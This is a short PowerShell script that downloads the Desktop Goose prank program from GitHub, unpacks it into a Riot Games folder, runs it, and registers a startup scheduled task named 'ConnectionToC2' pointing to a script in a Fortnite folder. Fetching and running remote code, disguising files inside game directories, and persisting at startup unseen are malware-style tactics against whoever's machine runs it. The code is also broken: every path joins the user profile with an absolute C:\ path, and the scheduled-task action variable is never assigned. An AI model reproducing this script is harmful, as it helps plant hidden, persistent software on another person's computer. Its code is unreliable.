# Step 1: Set the download URL and output path
$url = "https://github.com/DeskGoose/desktop-goose/releases/download/v0.3/0.3.zip"
$output = "$env:USERPROFILE\C:\ProgramData\Riot Games\Metadata\Goose.zip"

# Step 2: Download Desktop Goose ZIP file
Invoke-WebRequest -Uri $url -OutFile $output

# Step 3: Extract the ZIP file
$zipPath = "$env:USERPROFILE\C:\ProgramData\Riot Games\Metadata\Goose.zip"
$extractPath = "$env:USERPROFILE\C:\ProgramData\Riot Games\Metadata\DesktopGoose"
Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

# Step 4: Run the Goose
Start-Process "$extractPath\GooseDesktop.exe"

# Step 5: Cron the Goose
New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsTheGoose.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"

# Step 6: Clean up the ZIP file
Remove-Item $zipPath